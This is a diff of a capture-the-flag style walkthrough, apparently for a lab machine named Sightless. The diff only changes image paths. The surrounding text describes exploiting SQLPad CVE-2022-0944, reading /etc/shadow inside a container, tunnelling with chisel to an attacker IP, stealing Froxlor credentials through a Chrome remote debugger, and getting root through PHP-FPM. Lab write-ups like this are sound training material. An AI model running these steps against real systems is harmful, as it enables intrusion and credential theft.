@@ -19,31 +19,31 @@ Let's start with reconnaissance.
 # RECONNAISSANCE
 ---
 
-![](cybersecurity/images/Pasted%2520image%252020250107170937.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107170937.png)
 
 `echo "10.10.11.32 sightless.htb" | sudo tee -a /etc/hosts 2>/dev/null`
 
-![](cybersecurity/images/Pasted%2520image%252020250107171213.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107171213.png)
 
 Now we can access the website, we have a `home`, `about`, `services` and a `contact us` part, if we go to the service part, we can see the following:
 
-![](cybersecurity/images/Pasted%2520image%252020250107171349.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107171349.png)
 
 We got a `sqlpad` service, if we click start now, we are redirected to `sqlpad.sightless.htb`, let's add this subdomain to `/etc/hosts` too:
 
-![](cybersecurity/images/Pasted%2520image%252020250107171612.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107171612.png)
 
 Now we find ourselves in a sqlpad panel, if we look further in the site, we find we are using sqlpad 6.10.0:
 
-![](cybersecurity/images/Pasted%2520image%252020250107172243.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107172243.png)
 
 Let's check the web and see if there's anything related to this version:
 
-![](cybersecurity/images/Pasted%2520image%252020250107172334.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107172334.png)
 
 Found `CVE-2022-0944` which talks about a Template injection leading to a RCE, I also found this [github exploit](https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944/blob/master/CVE-2022-0944) which works with bash:
 
-![](cybersecurity/images/Pasted%2520image%252020250107182931.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107182931.png)
 
 
 # EXPLOITATION
@@ -51,26 +51,26 @@ Found `CVE-2022-0944` which talks about a Template injection leading to a RCE, I
 
 Now we find ourselves in a sqlpad panel, if we look further in the site, we find we are using sqlpad 6.10.0:
 
-![](cybersecurity/images/Pasted%2520image%252020250107172243.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107172243.png)
 
 Let's check the web and see if there's anything related to this version:
 
-![](cybersecurity/images/Pasted%2520image%252020250107172334.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107172334.png)
 
 Found `CVE-2022-0944` which talks about a Template injection leading to a RCE, I also found this [github exploit](https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944/blob/master/CVE-2022-0944) which works with bash:
 
-![](cybersecurity/images/Pasted%2520image%252020250107182931.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107182931.png)
 
 Let's [[CYBERSECURITY/Commands/Shell Tricks/STABLE SHELL.md|stabilize the shell]], we would think that we already beat the machine since we got root access but no, we are inside of a docker container, we need some sort of way to get into the real machine, that's when we find 2 users, Michael and node:
 
-![](cybersecurity/images/Pasted%2520image%252020250107183525.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107183525.png)
 
-![](cybersecurity/images/Pasted%2520image%252020250107183536.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107183536.png)
 
 
 Since we already have root access in the docker container, let's read `/etc/shadow` and get the hash for michael user:
 
-![](cybersecurity/images/Pasted%2520image%252020250107183633.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107183633.png)
 
 ```ad-note
 Michael hash is: 
@@ -94,12 +94,12 @@ Let's log into ssh using those credentials:
 
 
 
-![](cybersecurity/images/Pasted%2520image%252020250107184751.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107184751.png)
 
 Now we are inside of michael's account, we can read the user flag now:
 
 ```ad-note
-![](cybersecurity/images/Pasted%2520image%252020250107184841.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107184841.png)
 user flag: `fa24b7668682e82a648c821ccf0d9526`
 ```
 
@@ -110,7 +110,7 @@ Let's proceed with privesc.
 
 We'll be using linpeas to show use some possible PE vectors:
 
-![](cybersecurity/images/Pasted%2520image%252020250107185646.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107185646.png)
 
 There is a weird connection made to the port `8080`, we need to investigate this, for this, we will use chisel as we need to resend the traffic back to our local machine:
 
@@ -122,14 +122,14 @@ There is a weird connection made to the port `8080`, we need to investigate this
 2. `chmod +x chisel`
 3. `./chisel client 10.10.15.36:9999 R:8080:127.0.0.1:8080`
 
-![](cybersecurity/images/Pasted%2520image%252020250107192250.png)
-![](cybersecurity/images/Pasted%2520image%252020250107192300.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107192250.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107192300.png)
 
 ```
 
 Now, let's visit the page:
 
-![](cybersecurity/images/Pasted%2520image%252020250107192343.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107192343.png)
 
 It's executing froxlor, in order to get the credentials, we'll be using the following exploit: [exploit](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/), this is basically a chrome remote debugger pentest, since the machine is running chrome actively, we can use this to exploit and access the credentials, once we've reproduce all the steps accordingly to the notes, we get the following credentials:
 
@@ -142,11 +142,11 @@ It's executing froxlor, in order to get the credentials, we'll be using the foll
 
 Let's log into the panel:
 
-![](cybersecurity/images/Pasted%2520image%252020250107193550.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107193550.png)
 
 We got access to the panel, as seen, we have a php section, this has the following:
 
-![](cybersecurity/images/Pasted%2520image%252020250107193639.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107193639.png)
 
 We got `php-fpm`, we are able to execute php code, we can do the following:
 
@@ -162,11 +162,11 @@ We got `php-fpm`, we are able to execute php code, we can do the following:
 ```ad-important
 If we did all correctly, we are able to get root access:
 
-![](cybersecurity/images/Pasted%2520image%252020250107194238.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107194238.png)
 
 This is the root flag:
 
-![](cybersecurity/images/Pasted%2520image%252020250107194255.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250107194255.png)
 
 Root: `1c4c6860beaa42a5b9b8e404fbcbf656`
 
